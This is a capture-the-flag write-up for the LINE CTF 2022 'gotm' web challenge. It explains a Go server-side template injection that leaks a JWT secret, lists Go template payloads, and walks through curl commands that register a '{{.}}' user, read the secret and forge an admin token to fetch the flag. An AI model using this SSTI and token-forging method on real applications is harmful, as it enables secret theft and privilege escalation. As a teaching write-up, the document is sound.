---
title: "[web] gotm (golang ssti) [line ctf 2022]"
date: 2022-03-28 18:47:59
tags:
    - ctf
    - writeup
    - web
categories:
    - CTF
---

# 0x1 tl;dr

gotm, a web question in linectf 2022. This is a very good example of golang **server side template injection (ssti)**

# 0x2 Vulnerability

take a brief a look at the code. In order to get the flag. we need to visit `/flag` whici is handled by `flag_handler`. 

`flag_handler` require a jwt token with `IsAdmin=True`. Therefore, in order to forge that, we need to have the secret of jwt token.

<!-- more -->

```
func flag_handler(w http.ResponseWriter, r *http.Request) {
    token := r.Header.Get("X-Token")
    if token != "" {
        id, is_admin := jwt_decode(token)
        if is_admin == true {
            // write flag
            return
        } else {
            w.WriteHeader(http.StatusForbidden)
            return
        }
    }
}
```

Then, the problem become how to get the jwt token from the server. 

In order to get the jwt secret, we need to use a ssti vulnerable in the `root_handler`. 

`root_handler` first obtain a `Account` struct from the token and print out the user id using template rendering. 

Since we can control the value in `acc.id` by register an account. We can inject arbitrary code into the template.
```
type Account struct {
    id         string
    pw         string
    is_admin   bool
    secret_key string
}
...
func root_handler(w http.ResponseWriter, r *http.Request) {
    ...
    acc := get_account(id)
    ...
    tpl, err := template.New("").Parse("Logged in as " + acc.id)
    ...
    return
}

```

# 0x3 Some useful go ssti injection

1. `{{.}}` will print out the whole struct that being passed
2. `{{.PublicField}}`  will print out the public field
3. `{{printf "%s" "asdf"}}` will do a normal printf thing

```
package main

import (
    "os"
    "text/template"
)

type SSTI struct {
    privateMember         string
    PublicMember         string
    value   int
}

func main() {
    ssti := SSTI{
        privateMember : "private",
        PublicMember : "public",
        value : 1,
    }
    tpl, _ := template.New("").Parse("Here is {{.}} \n")
    tpl.Execute(os.Stdout, ssti) // print "Here is {private public 1}"
    tpl, _ = template.New("").Parse("Here is {{.PublicMember}} \n")
    tpl.Execute(os.Stdout, ssti) // print "Here is public"
    tpl, _ = template.New("").Parse("Here is {{printf \"%s\" \"asdf\"}} \n")
    tpl.Execute(os.Stdout, ssti) // print "Here is asdf""
}

```

# 0x4 Solution

1. register as userid =  `{{.}}` using `/regist`
2. get token using `/auth` to get a token
3. using this token to get jwt secret (which is `fasdf972u1031xu90zm10Av`)
4. using the jwt secret to forget a jwt token.
5. get the flag

```
$ curl --request GET 'http://34.146.226.125/regist?id=%7B%7B%2E%7D%7D1&pw=asdf'
{"status":true,"msg":""}


$ curl --request GET 'http://34.146.226.125/auth?id=%7B%7B%2E%7D%7D&pw=asdf'
{"status":true,"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM"}


$ curl --header 'X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.rthp4OaE1Iau8Q9PIxoB-F9VGukYpbX1I-GpPPDSGhM' --request GET 'http://34.146.226.125/'
Logged in as {{{.}} asdf false fasdf972u1031xu90zm10Av}

$ curl --header 'X-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MTY0ODUyMjgzMn0.nsbn28xiVYZkPPJqAJYv01PEGYuugWBIyriBaB7hcIY' --request GET 'http://34.146.226.125/flag'
{"status":true,"msg":"Hi {{.}}, flag is LINECTF{country_roads_takes_me_home}"}
```